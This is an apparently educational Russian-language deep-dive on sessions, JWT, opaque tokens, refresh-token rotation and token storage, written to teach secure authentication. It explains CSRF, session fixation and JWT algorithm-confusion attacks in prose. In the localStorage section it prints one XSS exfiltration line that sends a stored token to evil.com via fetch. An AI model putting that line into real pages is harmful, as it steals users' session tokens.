---
title: "Sessions, JWT и токены: механизмы аутентификации"
created: 2026-02-11
modified: 2026-02-11
type: deep-dive
status: published
confidence: high
tags:
  - topic/security
  - type/deep-dive
  - level/intermediate
related:
  - "[[authentication-authorization]]"
  - "[[auth-oauth2-oidc]]"
  - "[[auth-api-service-patterns]]"
  - "[[security-cryptography-fundamentals]]"
  - "[[security-https-tls]]"
prerequisites:
  - "[[authentication-authorization]]"
  - "[[security-cryptography-fundamentals]]"
reading_time: 31
difficulty: 6
study_status: not_started
mastery: 0
last_reviewed:
next_review:
---

# Sessions, JWT и токены: механизмы аутентификации

HTTP не помнит, кто ты. Каждый запрос -- чистый лист: сервер не знает, что предыдущий запрос пришёл от того же человека. Sessions, JWT и opaque-токены -- это три фундаментально разных ответа на один и тот же вопрос: как сохранить состояние аутентификации поверх протокола без состояния. Ключевой инсайт: ни один из этих подходов не является "лучшим" -- каждый решает проблему идентификации ценой конкретных компромиссов в безопасности, масштабируемости и сложности.

---

## Зачем это знать

HTTP (HyperText Transfer Protocol) -- stateless-протокол. Это означает, что сервер не сохраняет никакой информации между запросами. Когда вы отправляете GET-запрос на `/profile`, сервер не знает, что пять секунд назад вы отправили POST на `/login` с правильным паролем. Для сервера каждый запрос -- незнакомец.

Это архитектурное решение было принято сознательно. Тим Бернерс-Ли и его команда в CERN в 1991 году проектировали HTTP для обмена научными документами, где состояние не нужно: запросил страницу -- получил страницу. Statelessness упрощает сервер: не нужно хранить контекст тысяч одновременных клиентов, не нужно синхронизировать состояние между серверами, не нужно решать, когда "забыть" клиента.

Но когда веб перестал быть коллекцией статических страниц и стал платформой для приложений -- почтовых клиентов, интернет-банков, социальных сетей -- отсутствие состояния превратилось из преимущества в проблему. Невозможно показать "Ваши письма", если сервер не знает, кто "вы". Невозможно обработать перевод денег, если сервер не уверен, что запрос пришёл от владельца счёта.

Механизмы аутентификации -- sessions, JWT, opaque tokens -- это мост между stateless HTTP и stateful приложениями. Понимание их устройства, trade-offs и уязвимостей критично для любого разработчика, работающего с веб-приложениями, API или мобильными клиентами.

> **Ключевая идея:** Различие между sessions и JWT -- это не различие между "старым" и "новым", а различие между двумя фундаментальными подходами к распределению ответственности: сервер хранит состояние (sessions) или клиент носит его с собой (JWT).

---

## Терминология

| Термин | Что это | Аналогия из реальной жизни |
|--------|---------|---------------------------|
| **Session** | Запись на сервере о текущем пользователе, связанная с cookie в браузере | Номерок в гардеробе: отдал пальто, получил номерок, показываешь номерок -- получаешь пальто |
| **JWT** | JSON Web Token -- самодостаточный подписанный токен с данными внутри | Паспорт с голограммой: данные внутри документа, подпись подтверждает подлинность, не нужно звонить в МИД |
| **Opaque token** | Случайная строка без встроенных данных, требующая серверной валидации | Банковская карта: номер на карте ничего не значит без обращения к банку |
| **Access token** | Короткоживущий токен для доступа к защищённым ресурсам | Дневной пропуск: действует 8 часов, потом нужен новый |
| **Refresh token** | Долгоживущий токен для получения нового access token | Трудовой договор: пока он действует, вам каждый день выдают новый пропуск |
| **CSRF** | Cross-Site Request Forgery -- атака, использующая автоматическую отправку cookies | Поддельное письмо от вашего имени: банк видит ваши cookies и выполняет запрос |
| **XSS** | Cross-Site Scripting -- внедрение вредоносного JavaScript-кода | Подброшенный диктофон: записывает всё, что происходит в вашем браузере |
| **Claim** | Утверждение о пользователе внутри JWT (имя, роль, время истечения) | Графа в паспорте: "Фамилия", "Дата рождения", "Срок действия" |
| **Bearer token** | Токен, который даёт доступ любому его предъявителю | Ключ от квартиры: кто нашёл -- тот и откроет, без вопросов "а вы кто?" |

---

## Prerequisites

| Prerequisite | Что нужно знать | Почему |
|-------------|----------------|--------|
| [[authentication-authorization]] | Разница AuthN vs AuthZ, обзор способов аутентификации, OAuth 2.0 flows | Текущий файл углубляет механизмы AuthN, не повторяя основы |
| [[security-cryptography-fundamentals]] | Симметричное и асимметричное шифрование, хеширование, HMAC, цифровые подписи | JWT использует HMAC и RSA для подписи, без понимания криптографии подпись -- "магия" |

---

## Историческая справка

### Проблема stateless HTTP: хронология решений

История механизмов аутентификации в вебе -- это история постепенного усложнения, где каждое новое решение появлялось как ответ на ограничения предыдущего.

**1991 -- HTTP без аутентификации.** Первая версия HTTP (HTTP/0.9) не предусматривала никакого механизма идентификации. Веб был коллекцией публичных документов. Каждый запрос -- анонимный.

**1996 -- HTTP Basic Auth (RFC 2617).** Первая попытка добавить аутентификацию. Браузер отправляет логин и пароль в заголовке `Authorization: Basic base64(user:pass)` с каждым запросом. Проблема очевидна: пароль передаётся в открытом виде (Base64 -- это кодировка, не шифрование). Без HTTPS любой, перехватывающий трафик, получает пароль. Кроме того, нет механизма "выйти" -- браузер продолжает отправлять заголовок до закрытия.

**1997 -- HTTP Digest Auth (RFC 2069).** Попытка решить проблему передачи пароля. Вместо пароля отправляется его хеш с одноразовым nonce. Звучит лучше, но на практике оказалось сложным в реализации и ненадёжным -- уязвимо для man-in-the-middle без HTTPS. Digest Auth так и не получил широкого распространения.

**1994 -- Cookies (Netscape, Lou Montulli).** Параллельно с развитием HTTP аутентификации, инженер Netscape Лу Монтулли решил другую проблему: как реализовать корзину в интернет-магазине. Его решение -- cookies: небольшие фрагменты данных, которые сервер просит браузер сохранить и отправлять с каждым последующим запросом. Cookies сами по себе не являются механизмом аутентификации, но стали фундаментом для session-based authentication.

> **Ключевая идея:** Cookies были изобретены для корзины покупок, не для аутентификации. Их адаптация под sessions -- побочный эффект, который определил архитектуру веб-безопасности на следующие 30 лет.

**1997-2000 -- Session-based authentication.** Комбинация cookies и серверного хранилища стала стандартным подходом. PHP, Java Servlets, ASP -- все серверные платформы реализовали sessions. Механизм прост: при логине сервер создаёт запись (session), генерирует уникальный ID и отправляет его в cookie. При каждом запросе браузер автоматически отправляет cookie, сервер находит session по ID.

**2010-2015 -- Кризис масштабирования.** С ростом мобильных приложений и микросервисов session-based authentication столкнулся с проблемами. Мобильные приложения не имеют cookie jar, как браузеры. Микросервисы требуют аутентификации между сервисами, а не между браузером и сервером. Sticky sessions (привязка клиента к конкретному серверу) противоречат принципу горизонтального масштабирования.

**2015 -- JWT (RFC 7519, IETF JOSE Working Group).** JSON Web Token стал ответом на проблему масштабирования. Токен содержит всю необходимую информацию (claims) и подписан криптографически. Сервер не хранит состояние -- он проверяет подпись и доверяет данным внутри токена. Спецификацию разработала рабочая группа JOSE (JSON Object Signing and Encryption) в IETF, основные авторы -- Michael Jones (Microsoft), John Bradley и Nat Sakimura.

**2020+ -- Гибридные подходы.** Практика показала, что чистый JWT создаёт проблему отзыва, а чистые sessions -- проблему масштабирования. Индустрия пришла к гибридным схемам: JWT как access token + opaque refresh token в httpOnly cookie + Redis для blacklist.

```
Timeline аутентификации в вебе:

1991  1994    1996    1997         2015    2020+
 │     │       │       │            │       │
 ▼     ▼       ▼       ▼            ▼       ▼
HTTP   Cookies Basic   Sessions    JWT     Hybrid
       (Lou    Auth    (server-    (IETF   (JWT +
       Montulli)(RFC   side +      JOSE    sessions
       Netscape 2617)  cookies)    WG)     + Redis)
 │              │                   │
 │   Проблема:  │    Проблема:      │    Проблема:
 │   пароль в   │    масштабиро-    │    нет отзыва
 │   каждом     │    вание,         │    до expiration
 │   запросе    │    мобильные      │
 │              │    клиенты        │
 ▼              ▼                   ▼
 Каждое решение порождало новую проблему
```

Мы разобрали, ПОЧЕМУ появились эти механизмы. Теперь разберём, КАК каждый из них работает изнутри.

---

## Sessions: stateful-аутентификация

### Механизм работы

Session-based authentication -- это подход, при котором сервер берёт на себя ответственность за хранение состояния аутентификации. Клиент (браузер) хранит только идентификатор сессии -- случайную строку, которая сама по себе не несёт никакой информации.

Процесс работает в четыре шага. Первый: пользователь отправляет логин и пароль. Второй: сервер проверяет учётные данные, создаёт запись о сессии в хранилище (память, база данных, Redis) и генерирует уникальный session ID -- криптографически случайную строку длиной 128+ бит. Третий: сервер отправляет session ID клиенту в заголовке `Set-Cookie`. Четвёртый: при каждом последующем запросе браузер автоматически включает cookie с session ID, сервер находит соответствующую запись в хранилище и знает, кто перед ним.

```
Поток session-based аутентификации:

  Браузер                              Сервер          Session Store
    │                                    │                  │
    │  1. POST /login                    │                  │
    │     {email, password}              │                  │
    │──────────────────────────────────▶│                  │
    │                                    │                  │
    │                    2. Проверить     │  3. Создать     │
    │                       пароль       │     session     │
    │                                    │────────────────▶│
    │                                    │   {id: "x7k2",  │
    │                                    │    userId: 42,   │
    │                                    │    role: "user"} │
    │                                    │                  │
    │  4. Set-Cookie: sid=x7k2;          │                  │
    │     HttpOnly; Secure; SameSite     │                  │
    │◀──────────────────────────────────│                  │
    │                                    │                  │
    │  5. GET /profile                   │                  │
    │     Cookie: sid=x7k2               │                  │
    │──────────────────────────────────▶│                  │
    │                                    │  6. Найти x7k2  │
    │                                    │────────────────▶│
    │                                    │  {userId: 42}   │
    │                                    │◀────────────────│
    │  7. 200 OK                         │                  │
    │     {name: "Алексей", ...}         │                  │
    │◀──────────────────────────────────│                  │
```

### Аналогия: гардероб в театре

Представьте гардероб в театре. Вы приходите, сдаёте пальто (логин + пароль), получаете номерок (session ID). Номерок -- это маленький пластиковый кружок с числом "47". Число "47" само по себе ничего не значит. Ваше пальто не хранится внутри номерка -- оно висит в гардеробе (серверное хранилище). Когда вы показываете номерок, гардеробщик (сервер) ищет вешалку 47 и отдаёт ваше пальто.

Эта аналогия точна в нескольких важных деталях. Во-первых, потеря номерка -- серьёзная проблема: нашедший его может забрать ваше пальто (session hijacking). Во-вторых, гардероб имеет ограниченную ёмкость (серверная память). В-третьих, если вы придёте в другой театр с тем же номерком -- ничего не получите (session привязана к конкретному серверу, если нет shared store).

### Эволюция серверного хранилища

Первые реализации sessions хранили данные прямо в оперативной памяти процесса сервера. Для одного сервера это работает отлично: поиск по ключу в хеш-таблице -- O(1), никаких сетевых вызовов. Но у in-memory storage есть два фатальных недостатка. Первый: при перезагрузке сервера все сессии пропадают -- каждый пользователь "разлогинивается". Второй: если серверов несколько (за load balancer), запрос может попасть на сервер, который не знает эту сессию.

Файловая система решила проблему перезагрузки: сессия записывается в файл, при старте сервер читает файлы. PHP до сих пор по умолчанию хранит сессии в файлах (`/tmp/sess_*`). Но файловая система не решает проблему нескольких серверов и работает медленнее, чем память.

База данных (MySQL, PostgreSQL) решила обе проблемы: данные персистентны и доступны всем серверам. Но за это пришлось заплатить латентностью: каждый запрос добавляет SQL-запрос к базе данных. При тысячах запросов в секунду база данных становится узким местом.

Redis и Memcached стали золотым стандартом для session storage к 2015 году. Redis -- это in-memory key-value store с опциональной персистентностью. Он сочетает скорость оперативной памяти (субмиллисекундные запросы) с доступностью по сети (все серверы могут обращаться к одному Redis). Встроенный механизм TTL (Time To Live) автоматически удаляет истёкшие сессии. Redis Cluster обеспечивает горизонтальное масштабирование и отказоустойчивость.

> **Ключевая идея:** Эволюция session storage (память → файлы → БД → Redis) -- это микрокосм общей эволюции в распределённых системах: от простого и локального к сложному и распределённому, где каждый шаг решает проблемы предыдущего.

### Проблема масштабирования

Когда за load balancer стоят несколько серверов, возникает вопрос: на какой сервер отправить запрос пользователя, если его сессия создана на сервере A?

**Sticky sessions** (session affinity) -- первое решение. Load balancer запоминает, что пользователь X привязан к серверу A, и всегда отправляет его запросы туда. Проблемы: если сервер A упадёт -- все его сессии потеряны. Нагрузка распределяется неравномерно -- один сервер может быть перегружен, пока другие простаивают. Невозможен auto-scaling: новые серверы не получают трафик от существующих пользователей.

**Shared session store** (Redis/Memcached) -- правильное решение. Все серверы обращаются к одному хранилищу. Любой сервер может обслужить любой запрос. Сервер может упасть без потери сессий. Auto-scaling работает без ограничений. Цена -- дополнительная зависимость (Redis) и сетевой вызов на каждый запрос.

### Атаки на sessions

Sessions уязвимы для нескольких категорий атак, и понимание каждой из них критично для безопасной реализации.

**CSRF (Cross-Site Request Forgery)** -- самая известная уязвимость session-based authentication. Механизм атаки основан на том, что браузер автоматически включает cookies в каждый запрос к домену, независимо от того, откуда этот запрос инициирован. Если пользователь залогинен в банк (есть session cookie) и заходит на вредоносный сайт, этот сайт может отправить запрос к банку от имени пользователя. Браузер автоматически приложит cookie -- банк увидит валидную сессию и выполнит запрос.

Защита от CSRF эволюционировала: от CSRF-токенов (сервер генерирует одноразовый токен, вставляет в форму, проверяет при получении) к атрибуту `SameSite` в cookies (2016, Chrome 51). SameSite cookie со значением `Strict` или `Lax` не отправляется при cross-origin запросах, что нейтрализует CSRF без дополнительных токенов.

**Session fixation** -- атака, при которой злоумышленник "навязывает" жертве известный ему session ID до аутентификации. Если сервер не генерирует новый session ID при логине, злоумышленник может использовать навязанный ID после того, как жертва аутентифицируется. Защита: всегда создавать новый session ID при смене уровня привилегий (логин, повышение роли).

**Session hijacking** -- перехват session ID. Векторы: незашифрованный трафик (HTTP без TLS), XSS (вредоносный JavaScript читает cookie, если не установлен httpOnly), предсказуемые session ID (если генератор не криптографически стойкий). Защита: HTTPS, httpOnly cookies, криптографически случайные ID.

Мы разобрали, как работает stateful-подход с серверным хранилищем. Но что если убрать хранилище совсем? Что если клиент будет носить всю информацию о себе в каждом запросе -- и серверу останется лишь проверить подлинность этой информации?

---

## JWT: stateless-аутентификация

### Принцип работы

JWT (JSON Web Token, произносится "джот") -- это подход, при котором сервер не хранит состояние аутентификации. Вместо этого он создаёт самодостаточный токен, который содержит всю необходимую информацию (кто пользователь, какие у него права, когда токен истекает) и подписывает его криптографической подписью.

Процесс: пользователь отправляет логин и пароль. Сервер проверяет учётные данные и формирует JWT -- строку, содержащую данные (claims) и подпись. Сервер возвращает JWT клиенту. Клиент сохраняет JWT и при каждом запросе отправляет его в заголовке `Authorization: Bearer <token>`. Сервер получает токен, проверяет подпись (не обращаясь ни к какому хранилищу) и, если подпись верна, доверяет данным внутри токена.

### Аналогия: паспорт с голограммой

Представьте международный паспорт. Внутри -- ваши данные: имя, дата рождения, гражданство, фотография, срок действия. На каждой странице -- голограмма и водяные знаки, которые невозможно подделать без доступа к государственному печатному оборудованию.

Когда вы показываете паспорт на границе, пограничник не звонит в МИД вашей страны для проверки. Он смотрит на голограмму (подпись), проверяет, что она не нарушена, и доверяет данным внутри. Если срок действия истёк -- паспорт недействителен (claim `exp`). Если фотография не совпадает -- отказ.

JWT работает аналогично. "Данные" -- это payload (claims). "Голограмма" -- это криптографическая подпись. "Пограничник" -- это сервер, проверяющий подпись. "МИД" -- это session store, к которому обращаться не нужно. И так же, как паспорт, JWT можно прочитать -- данные не зашифрованы. Любой может открыть паспорт и прочитать имя. Но подделать подпись -- невозможно.

### Структура JWT

JWT состоит из трёх частей, разделённых точками: `Header.Payload.Signature`. Каждая часть закодирована в Base64URL -- варианте Base64, безопасном для URL (символы `+` и `/` заменены на `-` и `_`, убраны паддинговые `=`).

```
Структура JWT:

eyJhbGciOi...  .  eyJzdWIiOi...  .  SflKxwRJSM...
─────┬──────     ─────┬──────     ─────┬──────
     │                │                │
  Header           Payload         Signature
  (алгоритм)      (данные)        (подпись)

┌──────────────────────────────────────────────────┐
│ HEADER (декодированный)                           │
│ {                                                │
│   "alg": "RS256",    // Алгоритм подписи          │
│   "typ": "JWT"       // Тип токена                │
│ }                                                │
├──────────────────────────────────────────────────┤
│ PAYLOAD (декодированный) -- НЕ ЗАШИФРОВАН!        │
│ {                                                │
│   "iss": "auth.example.com",  // Кто выдал        │
│   "sub": "user_42",           // О ком токен       │
│   "aud": "api.example.com",   // Для кого          │
│   "exp": 1739400000,          // Когда истекает     │
│   "iat": 1739313600,          // Когда выдан        │
│   "nbf": 1739313600,          // Не раньше чем      │
│   "jti": "unique-id-123",     // Уникальный ID      │
│   "role": "admin",            // Приватный claim    │
│   "email": "user@example.com" // Приватный claim    │
│ }                                                │
├──────────────────────────────────────────────────┤
│ SIGNATURE                                         │
│ RS256(                                            │
│   base64url(header) + "." + base64url(payload),  │
│   privateKey                                      │
│ )                                                │
└──────────────────────────────────────────────────┘

⚠️  Base64URL -- это КОДИРОВКА, не шифрование!
    Любой может декодировать payload:
    atob("eyJzdWIiOiJ1c2VyXzQyIn0") → {"sub":"user_42"}
```

**Header** указывает алгоритм подписи (`alg`) и тип токена (`typ`). Это метаданные, необходимые для верификации. Сервер, получив токен, читает header, чтобы понять, каким алгоритмом проверять подпись.

**Payload** содержит claims -- утверждения о пользователе. RFC 7519 определяет семь registered claims (зарезервированных):

- **iss** (issuer) -- кто выдал токен. В микросервисной архитектуре это адрес auth-сервиса. Получатель проверяет, что доверяет этому issuer.
- **sub** (subject) -- о ком токен. Обычно user ID. Уникально идентифицирует пользователя.
- **aud** (audience) -- для кого предназначен токен. API-сервер отклонит токен, если его aud не совпадает с ожидаемым. Это предотвращает использование токена, выданного для одного сервиса, в другом.
- **exp** (expiration time) -- Unix timestamp, после которого токен недействителен. Сервер ОБЯЗАН отклонить токен с истёкшим exp.
- **nbf** (not before) -- Unix timestamp, до которого токен не принимается. Позволяет создать токен "на будущее".
- **iat** (issued at) -- Unix timestamp создания токена. Информационный claim, полезный для аудита.
- **jti** (JWT ID) -- уникальный идентификатор токена. Используется для предотвращения повторного использования (replay protection): сервер запоминает jti использованных токенов.

Public claims -- стандартизированные расширения (зарегистрированные в IANA). Private claims -- произвольные данные, определённые соглашением между сторонами (`role`, `email`, `tenant_id`). Важно: payload не зашифрован, поэтому private claims не должны содержать чувствительных данных (пароли, номера кредитных карт, персональные данные, подпадающие под GDPR).

**Signature** -- криптографическая подпись header и payload. Подпись гарантирует две вещи: целостность (данные не были изменены после подписания) и подлинность (токен создан обладателем секретного ключа). Изменение хотя бы одного символа в header или payload делает подпись недействительной.

### Алгоритмы подписи

Выбор алгоритма подписи -- одно из ключевых архитектурных решений при работе с JWT. Существуют три основных семейства алгоритмов.

**HS256 (HMAC-SHA256)** -- симметричный алгоритм. Один и тот же секретный ключ используется и для создания подписи, и для её проверки. Это быстро и просто, но создаёт проблему: каждый сервис, который должен проверять JWT, должен знать секретный ключ. А тот, кто знает ключ, может создавать новые токены. В монолитном приложении это не проблема -- ключ один, сервер один. В микросервисной архитектуре это означает, что компрометация любого сервиса позволяет создавать произвольные токены.

**RS256 (RSA-SHA256)** -- асимметричный алгоритм. Auth-сервис подписывает токены приватным ключом (который знает только он). Все остальные сервисы проверяют подпись публичным ключом. Публичный ключ можно раздавать свободно -- он позволяет проверить подпись, но не создать новую. Это идеальная схема для микросервисов: auth-сервис хранит приватный ключ, остальные сервисы получают публичный через JWKS (JSON Web Key Set) endpoint.

**ES256 (ECDSA-P256)** -- асимметричный алгоритм на эллиптических кривых. По безопасности сопоставим с RS256, но использует ключи в 10 раз короче (256 бит вместо 2048) и генерирует подписи меньшего размера. Это важно для мобильных клиентов и IoT, где размер токена влияет на трафик. ES256 -- рекомендованный выбор для новых проектов с 2020-х годов.

| Критерий | HS256 | RS256 | ES256 |
|----------|-------|-------|-------|
| Тип | Симметричный | Асимметричный | Асимметричный |
| Ключ для подписи | Shared secret | Private key | Private key |
| Ключ для проверки | Тот же shared secret | Public key | Public key |
| Скорость подписи | Быстро | Медленно | Среднее |
| Скорость проверки | Быстро | Среднее | Среднее |
| Размер подписи | 32 байта | 256 байт | 64 байта |
| Микросервисы | Нет (shared secret) | Да | Да |
| Когда использовать | Монолит, 1 сервис | Микросервисы, legacy | Новые проекты |

### JWS vs JWE: подпись vs шифрование

Важно понимать разницу между JWS (JSON Web Signature) и JWE (JSON Web Encryption). Когда говорят "JWT", в 95% случаев имеют в виду JWS -- токен с подписью. JWS гарантирует целостность и подлинность, но не конфиденциальность: payload читаем.

JWE -- это зашифрованный токен. Payload зашифрован, и прочитать его может только обладатель ключа расшифровки. JWE используется редко: в тех случаях, когда payload содержит данные, которые не должны быть видны промежуточным узлам (прокси, CDN, логирование). Пример: токен с медицинскими данными пациента.

На практике большинство систем используют JWS: payload содержит только user ID и роль, которые не являются секретом. Если данные нуждаются в конфиденциальности -- их лучше не включать в токен вообще, а запрашивать отдельным защищённым API-вызовом.

Мы разобрали, КАК устроен JWT. Теперь разберём, ЧТО может пойти не так. Этот раздел -- самый важный для практики.

---

## JWT: подводные камни безопасности

### Algorithm confusion attack

Это одна из самых опасных уязвимостей в истории JWT, приведшая к серии CVE в 2015-2017 годах. Атака эксплуатирует алгоритм `"alg": "none"` и путаницу между HS256 и RS256.

**Атака "none":** Спецификация RFC 7519 разрешает `"alg": "none"` -- JWT без подписи. Предназначено для случаев, когда токен уже защищён другим способом (например, внутри TLS-канала). Ранние библиотеки JWT принимали `"alg": "none"` без проверки. Злоумышленник мог взять любой JWT, заменить алгоритм на `"none"`, удалить подпись -- и токен принимался как валидный. Это как если бы пограничник принимал паспорта с пометкой "голограмма не требуется".

**HS256/RS256 confusion:** Сервер подписывает токены RS256 (приватный ключ). Публичный ключ доступен через JWKS endpoint. Злоумышленник скачивает публичный ключ, создаёт новый JWT с `"alg": "HS256"` и подписывает его публичным ключом как HMAC-секретом. Уязвимая библиотека видит `"alg": "HS256"`, берёт "ключ" (публичный RSA-ключ) и проверяет HMAC -- подпись совпадает. Это классический пример атаки, когда доверие к данным внутри токена (header) используется против системы.

Защита: всегда явно указывать ожидаемый алгоритм при верификации, никогда не принимать алгоритм из header на веру. Следующий код-пример демонстрирует разницу между уязвимым и безопасным подходом к верификации JWT.

```typescript
// ❌ УЯЗВИМО: алгоритм берётся из токена
const payload = jwt.verify(token, publicKey);

// ✅ БЕЗОПАСНО: алгоритм задан явно
const payload = jwt.verify(token, publicKey, {
  algorithms: ['RS256'],  // Только RS256, ничего другого
  issuer: 'auth.example.com',
  audience: 'api.example.com'
});
```

Этот фрагмент демонстрирует ключевой принцип: никогда не доверять данным, которые контролирует клиент. Header JWT контролируется тем, кто создал токен -- а это может быть злоумышленник. Параметр `algorithms` фиксирует белый список допустимых алгоритмов на стороне сервера. Дополнительная проверка `issuer` и `audience` ограничивает область действия токена.

### Payload -- не зашифрован

Это повторяется в каждом руководстве по JWT, и каждый год кто-то совершает эту ошибку. Base64URL -- это кодировка для транспорта, не шифрование. Любой может декодировать payload без ключа. Хранение в JWT паролей, номеров кредитных карт, персональных данных (PII), медицинской информации -- грубое нарушение безопасности и, в юрисдикциях с GDPR, законодательства.

### Утечка токенов

JWT как bearer token (токен на предъявителя) даёт доступ любому, кто им владеет. Утечка токена эквивалентна утечке пароля, но хуже: пароль можно поменять мгновенно, а JWT действует до истечения срока. Векторы утечки: заголовок Referer (если токен в URL query parameter, он попадёт в Referer при переходе на другой сайт), серверные логи (access logs часто содержат заголовки запросов), история браузера (если токен в URL), фронтенд-код в открытых репозиториях (hardcoded tokens).

### Проблема отзыва

Это фундаментальный trade-off JWT. Stateless означает: сервер не хранит информацию о выданных токенах. Следствие: сервер не может "забыть" токен до истечения его срока. Если пользователь нажал "Выйти", его JWT продолжает работать. Если аккаунт скомпрометирован, JWT продолжает работать. Если пользователь сменил пароль -- JWT, выданный до смены пароля, продолжает работать.

Это как паспорт с голограммой: если страна хочет его аннулировать, пограничник не узнает об этом, просто посмотрев на голограмму. Нужна система чёрных списков -- а это возвращает нас к серверному хранилищу.

### Размер токена

Session ID -- это 32-64 символа. JWT -- от 500 байт до нескольких килобайт, в зависимости от количества claims и алгоритма подписи (RS256 добавляет ~256 байт подписи). JWT отправляется с каждым HTTP-запросом. В приложении с десятками запросов в минуту это ощутимый трафик, особенно на мобильных устройствах с лимитированным трафиком.

---

## Opaque tokens

Мы разобрали два полюса: sessions (всё на сервере) и JWT (всё в токене). Opaque tokens -- это третий подход, занимающий среднюю позицию.

### Что такое opaque token

Opaque token -- это криптографически случайная строка (обычно 256 бит, закодированная в hex или base64), которая сама по себе не содержит никаких данных. Как и session ID, она требует обращения к серверу для валидации. Как и JWT, она передаётся в заголовке `Authorization: Bearer <token>`, а не в cookie.

Название "opaque" (непрозрачный) отражает ключевое свойство: глядя на токен, невозможно извлечь информацию о пользователе. Это противоположность JWT, который прозрачен -- payload читается кем угодно.

### Когда использовать opaque tokens вместо JWT

Opaque tokens предпочтительны в трёх сценариях. Первый: когда требуется мгновенный отзыв без задержки. Второй: когда утечка информации из токена недопустима (JWT payload читаем). Третий: когда система уже имеет централизованное хранилище и дополнительный lookup не является проблемой.

| Критерий | JWT | Opaque token |
|----------|-----|-------------|
| Данные внутри | Да (claims) | Нет |
| Валидация без сервера | Да (проверка подписи) | Нет (нужен lookup) |
| Мгновенный отзыв | Нет (ждать exp) | Да (удалить из store) |
| Утечка информации | Да (payload читаем) | Нет |
| Размер | 500+ байт | 32-64 байта |
| Горизонтальное масштабирование | Отлично (stateless) | Нужен shared store |
| Микросервисы | Каждый сервис проверяет сам | Нужен auth-сервис для проверки |

На практике гибридный подход стал стандартом: JWT как access token (для быстрой валидации без сетевых вызовов) и opaque token как refresh token (для безопасного долгосрочного хранения с возможностью отзыва).

---

## Refresh token patterns

### Зачем нужны refresh tokens

Проблема: короткоживущие access tokens (5-15 минут) -- хорошо для безопасности (если токен украден, он быстро истекает), но плохо для UX (пользователь "разлогинивается" каждые 15 минут). Долгоживущие access tokens -- хорошо для UX, но плохо для безопасности.

Refresh token -- это компромисс. Access token живёт 5-15 минут и используется для доступа к API. Refresh token живёт 7-30 дней и используется только для получения нового access token. Если access token украден, у злоумышленника есть максимум 15 минут. Если refresh token украден -- его можно отозвать (он хранится в серверной базе).

### Token rotation

Простейшая схема: клиент отправляет refresh token → сервер возвращает новую пару (access + refresh), старый refresh token становится недействительным. Это называется refresh token rotation.

Ротация решает важную проблему: если злоумышленник перехватил refresh token, легитимный пользователь и злоумышленник начинают "гонку". Кто первый использует refresh token -- получит новую пару. Второй получит ошибку, потому что старый токен уже недействителен.

### Token families и обнаружение компрометации

Продвинутая стратегия: каждый refresh token принадлежит "семье" (token family), привязанной к изначальному логину. Все ротации внутри одной семьи отслеживаются.

Если сервер получает уже использованный refresh token (повторное использование), это сигнал компрометации: злоумышленник и легитимный пользователь оба пытаются обновить токены. В этом случае сервер аннулирует всю token family -- все refresh tokens этой сессии становятся недействительными. Пользователь должен залогиниться заново, но злоумышленник теряет доступ.

```
Token Family: обнаружение компрометации

Нормальный сценарий:
  Login → RT₁ → RT₂ → RT₃ → RT₄  (каждый используется один раз)

Сценарий компрометации:
  Login → RT₁ → RT₂ ─┬─ Пользователь: RT₂ → RT₃ (ОК)
                      │
                      └─ Злоумышленник: RT₂ → ОШИБКА!
                         (RT₂ уже использован)

                         Сервер: RT₂ использован повторно!
                         → Аннулировать ВСЮ семью
                         → RT₃ тоже недействителен
                         → Всем: повторный логин
```

### Deny-list в Redis

Для отзыва refresh tokens используется deny-list (чёрный список) в Redis. При отзыве токена его jti (уникальный идентификатор) добавляется в Redis с TTL, равным оставшемуся времени жизни токена. При каждом refresh-запросе сервер проверяет, нет ли jti в deny-list. Redis здесь идеален: субмиллисекундные запросы, автоматическое удаление по TTL (не нужно чистить список вручную).

Это компромисс: мы добавляем серверное хранилище, частично теряя stateless-природу JWT. Но deny-list гораздо компактнее, чем полноценный session store: в нём хранятся только отозванные токены (единицы в день), а не все активные сессии (тысячи одновременно).

---

## Хранение токенов на клиенте

Мы разобрали серверную сторону: как создавать, подписывать и проверять токены. Но не менее важно, ГДЕ клиент хранит полученный токен. Неправильное хранение -- самая частая причина утечки токенов.

### Браузер: четыре варианта

**localStorage** -- персистентное хранилище, доступное через JavaScript API `window.localStorage`. Данные сохраняются при закрытии вкладки и перезагрузке. Главная уязвимость: любой JavaScript-код на странице может прочитать localStorage. XSS-уязвимость (внедрение вредоносного скрипта) означает кражу токена одной строкой: `fetch('https://evil.com?token=' + localStorage.getItem('token'))`. Для sensitive tokens localStorage недопустим.

**sessionStorage** -- аналог localStorage, но данные удаляются при закрытии вкладки. Те же XSS-риски, плюс неудобство: открытие новой вкладки требует повторной аутентификации.

**httpOnly Secure cookie** -- cookie с флагами `httpOnly` (недоступен из JavaScript) и `Secure` (отправляется только по HTTPS). JavaScript не может прочитать этот cookie -- XSS не приводит к краже токена. Браузер автоматически включает cookie в каждый запрос к домену. Минус: cookies уязвимы для CSRF, поэтому требуют дополнительной защиты (SameSite, CSRF tokens).

**In-memory (переменная в JavaScript)** -- токен хранится в переменной, не записывается ни в cookie, ни в storage. Самый безопасный вариант: JavaScript-переменная недоступна из другого скрипта (нет глобальных window-свойств), не сохраняется на диск, исчезает при закрытии вкладки или обновлении страницы. Минус: при каждом обновлении страницы (F5) токен теряется.

### Современный гибридный подход

Индустрия пришла к гибридной схеме, которая комбинирует преимущества разных методов. Access token хранится in-memory (в JavaScript-переменной или в замыкании). Refresh token хранится в httpOnly Secure SameSite cookie. При обновлении страницы (F5) access token теряется. Браузер автоматически отправляет cookie с refresh token на endpoint `/refresh`. Сервер проверяет refresh token, возвращает новый access token. Клиент сохраняет новый access token в память.

```
Гибридный подход: token storage

  ┌─────────────────────────────────────────────────┐
  │ БРАУЗЕР                                          │
  │                                                  │
  │  ┌──────────────┐    ┌────────────────────────┐ │
  │  │ JS Memory    │    │ httpOnly Cookie          │ │
  │  │              │    │                          │ │
  │  │ accessToken  │    │ refreshToken             │ │
  │  │ = "eyJ..."   │    │ (невидим для JS)         │ │
  │  │              │    │                          │ │
  │  │ ⚡ Быстро     │    │ 🔒 Защищён от XSS       │ │
  │  │ ❌ Теряется   │    │ ✅ Переживает F5         │ │
  │  │    при F5     │    │ ⚠  Нужен SameSite       │ │
  │  └──────┬───────┘    └───────────┬──────────────┘ │
  │         │                        │                │
  └─────────┼────────────────────────┼────────────────┘
            │                        │
  API-запросы:                Refresh при F5:
  Authorization: Bearer xxx   Cookie автоматически
  (из переменной)            отправляется браузером
            │                        │
            ▼                        ▼
  ┌───────────────┐          ┌──────────────┐
  │  API Server   │          │ Auth Server  │
  │ (проверяет    │          │ (выдаёт      │
  │  подпись JWT) │          │  новый AT)   │
  └───────────────┘          └──────────────┘
```

